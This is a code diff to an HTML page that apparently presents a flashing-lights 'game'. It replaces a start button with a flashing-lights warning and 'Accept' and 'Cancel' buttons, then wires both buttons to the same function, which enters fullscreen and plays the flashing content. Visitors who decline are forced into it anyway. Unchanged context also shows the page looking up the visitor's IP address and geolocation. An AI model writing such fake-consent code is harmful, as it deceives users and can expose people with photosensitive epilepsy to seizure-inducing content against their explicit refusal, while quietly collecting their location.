@@ -69,7 +69,7 @@
             border: none;
             cursor: pointer;
             border-radius: 5px;
-            margin-top: 20px;
+            margin: 10px; /* Add margin between buttons */
         }
         .loading-screen {
             position: absolute;
@@ -79,18 +79,27 @@
             height: 100%;
             background-color: black;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             z-index: 3;
+        }
+        .warning-text {
+            color: yellow;
+            font-size: 20px;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 20px;
         }
     </style>
 </head>
 <body>
 
-<!-- Initial Blank Screen with Button -->
+<!-- Initial Blank Screen with Buttons -->
 <div class="loading-screen">
-    <button id="startBtn" class="fullscreen-btn">Click to Start</button>
-    <p>warning site contains flashing images<p/>
+    <div class="warning-text">This game contains flashing lights</div>
+    <button id="acceptBtn" class="fullscreen-btn">Accept</button>
+    <button id="cancelBtn" class="fullscreen-btn">Cancel</button>
 </div>
 
 <!-- Flashing background -->
@@ -181,8 +190,12 @@
     }
 
     document.addEventListener("DOMContentLoaded", function() {
-        const startBtn = document.getElementById("startBtn");
-        startBtn.addEventListener("click", enterFullscreenAndPlay);
+        const acceptBtn = document.getElementById("acceptBtn");
+        const cancelBtn = document.getElementById("cancelBtn");
+
+        // Both buttons trigger the same action
+        acceptBtn.addEventListener("click", enterFullscreenAndPlay);
+        cancelBtn.addEventListener("click", enterFullscreenAndPlay);
 
         // Get IP address and geolocation
         getMyIpAddress();
